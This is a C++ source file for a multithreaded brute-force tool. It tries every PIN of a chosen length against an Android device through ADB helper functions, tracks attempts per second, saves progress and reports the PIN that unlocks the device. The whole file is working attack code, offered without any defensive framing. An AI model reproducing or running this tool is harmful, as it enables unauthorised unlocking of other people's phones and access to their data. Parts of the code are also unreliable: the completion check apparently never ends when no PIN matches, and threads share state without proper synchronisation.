#include "bruteforce_turbo.h"
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <ctime>
#include <thread>
#include <atomic>
#include <vector>
#include <string>
#include <unistd.h>

extern "C" {
    int adb_enter_pin_sakti(const char *pin);
    int adb_is_unlocked(void);
    int adb_state(void);
    void adb_init(void);
    void save_state(long cur, long tot);
}

static std::atomic<bool> g_found{false};
static std::atomic<long> g_progress{0};
static std::string g_found_pin;

static void worker(int digits, long start, long end, int delay_ms) {
    char pin[32];
    for (long i = start; i < end && !g_found; i++) {
        snprintf(pin, sizeof(pin), "%0*ld", digits, i);
        g_progress.store(i);
        if (adb_enter_pin_sakti(pin)) {
            g_found = true;
            g_found_pin = pin;
            return;
        }
        if (delay_ms > 0) usleep(delay_ms * 1000);
    }
}

extern "C" int turbo_brute(int digits, int delay_ms, long start, long end, int skip_confirm) {
    long total = 1;
    for (int i = 0; i < digits; i++) total *= 10;
    long s = (start >= 0 && start < total) ? start : 0;
    long e = (end > 0 && end <= total) ? end : total;

    printf("\n[TURBO C++] %d-digit: %ld-%ld = %ld PINs\n", digits, s, e-1, e-s);
    if (!skip_confirm) {
        printf("[?] Launch? [y/n]: ");
        char ans = getchar();
        if (ans != 'y' && ans != 'Y') return 0;
    }

    g_found = false;
    g_progress = 0;
    g_found_pin.clear();

    int nthreads = std::thread::hardware_concurrency();
    if (nthreads < 2) nthreads = 2;
    if (nthreads > 8) nthreads = 8;
    long chunk = (e - s) / nthreads;
    if (chunk < 1) chunk = 1;

    printf("[TURBO] Using %d threads\n", nthreads);
    std::vector<std::thread> threads;
    for (int t = 0; t < nthreads; t++) {
        long ts = s + t * chunk;
        long te = (t == nthreads - 1) ? e : ts + chunk;
        threads.emplace_back(worker, digits, ts, te, delay_ms);
    }

    double t0 = (double)clock() / CLOCKS_PER_SEC;
    long last_save = -1;
    while (!g_found) {
        usleep(200000);
        long cur = g_progress.load();
        double el = (double)clock() / CLOCKS_PER_SEC - t0;
        printf("\r[TURBO] %0*d | %.1f/s | %.0fs  ", digits, (int)cur, (cur-s)/el, el);
        fflush(stdout);
        if (cur - last_save >= 100) { save_state(cur, total); last_save = cur; }
        bool all_done = true;
        for (auto &t : threads) if (t.joinable()) { all_done = false; break; }
        if (all_done) break;
    }

    for (auto &t : threads) if (t.joinable()) t.join();
    printf("\n");

    if (g_found) {
        printf("\n[!!!] C++ TURBO FOUND: %s\n", g_found_pin.c_str());
        return 1;
    }
    return 0;
}
